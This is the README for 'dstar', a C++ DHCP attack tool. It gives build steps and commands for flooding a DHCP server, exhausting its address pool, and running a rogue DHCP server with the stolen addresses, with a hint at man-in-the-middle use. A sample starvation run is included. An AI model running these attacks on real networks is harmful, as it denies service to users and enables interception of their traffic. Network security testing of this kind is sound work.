![](https://img.shields.io/badge/Language-C++-orange.svg)
![](https://img.shields.io/badge/version-1.0.0-green.svg)
[![GPLv3 License](https://img.shields.io/badge/License-GPLv3-blue.svg)](http://www.gnu.org/licenses/gpl-3.0.html)

# Dstar :hammer:
This tool implement various DHCP attacks and can be used to make experiments and test on __your network__!

Supported features:
- Flood -> Flood DHCP server with large amount of DHCP discover messages (this attack not acquire addresses!)
- Starvation -> Try to acquire all addresses in DHCP pool, you can use this option with a rogue DHCP server... MITM? :smirk:
- Built-in rogue DHCP server

# Setting up dstar #

First of all getting the code from repository:

    $ git clone https://github.com/jacopodl/dstar

Compile it with followings command:

    $ cd dstar
    $ git submodule init && git submodule update
    $ cmake .
    $ make

Or if you are very busy:

    $ ./build.sh

# Usage example #
Flood DHCP server with discover messages:

    $ sudo ./dstar %interface% --flood

Exhaust DHCP pool and release all addresses on exit:

    $ sudo ./dstar %interface% --starvation

without release addresses:

    $ sudo ./dstar %interface% --starvation --no-release
    
Setting up rogue DHCP server with the stolen addresses:

    $ sudo ./dstar %interface% --starvation --server

Getting help with:

    $ ./dstar --help
    
# Action snapshot :camera:

    $ sudo ./dstar %interface% --starvation

    @@@@@@@    @@@@@@   @@@@@@@   @@@@@@   @@@@@@@
    @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@@@@@@
    @@!  @@@  !@@         @@!    @@!  @@@  @@!  @@@
    !@!  @!@  !@!         !@!    !@!  @!@  !@!  @!@
    @!@  !@!  !!@@!!      @!!    @!@!@!@!  @!@!!@!
    !@!  !!!   !!@!!!     !!!    !!!@!!!!  !!@!@!
    !!:  !!!       !:!    !!:    !!:  !!!  !!: :!!
    :!:  !:!      !:!     :!:    :!:  !:!  :!:  !:!
     :::: ::  :::: ::      ::    ::   :::  ::   :::
    :: :  :   :: : :       :      :   : :   :   : :
                                                     vX.x.x
    
    
    [<---] DHCP DISCOVER
    [--->] DHCP OFFER
    [<---] DHCP REQUEST
    [--->V] DHCP ACK
    	Ip:192.168.1.99 - MAC:52:c5:b9:35:0c:42 lease(s):21600
    
    [<---] DHCP DISCOVER
    [--->] DHCP OFFER
    [<---] DHCP REQUEST
    [--->V] DHCP ACK
    	Ip:192.168.1.118 - MAC:12:3c:09:28:ac:cb lease(s):21600
    
    [<---] DHCP DISCOVER
    ^CStopping...
    Releasing addresses...
    All done!

# Possible improvements: #
- Multithread capability
- DHCPv6
